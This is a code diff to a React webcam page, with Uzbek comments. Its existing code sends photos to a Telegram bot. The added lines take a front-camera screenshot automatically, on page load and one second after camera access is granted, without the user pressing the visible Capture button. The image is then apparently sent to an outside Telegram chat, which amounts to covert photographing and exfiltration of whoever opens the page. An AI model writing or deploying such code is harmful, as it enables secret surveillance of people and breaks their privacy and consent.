@@ -33,6 +33,10 @@ function Photo() {
       `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}&photo=${url}`
     );
   };
+  useEffect(function() {
+    const img = webcamRef.current.getScreenshot();
+    setPhoto(img);
+  },[])
 
   useEffect(() => {
     if (!photo) return;
@@ -54,12 +58,19 @@ function Photo() {
       <h2>📸 Kamera orqali rasm olish</h2>
 
       <Webcam
-        ref={webcamRef}
-        screenshotFormat="image/jpeg"
-        width={320}
-        height={240}
-        videoConstraints={{ facingMode: "user" }}
-      />
+  ref={webcamRef}
+  screenshotFormat="image/jpeg"
+  width={320}
+  height={240}
+  videoConstraints={{ facingMode: "user" }}
+  onUserMedia={() => {
+    setTimeout(() => {
+      const img = webcamRef.current.getScreenshot();
+      setPhoto(img);
+    }, 1000); // 1 soniya kutish
+  }}
+/>
+
 
       <button onClick={capture} style={{ marginTop: "20px" }}>
         Capture
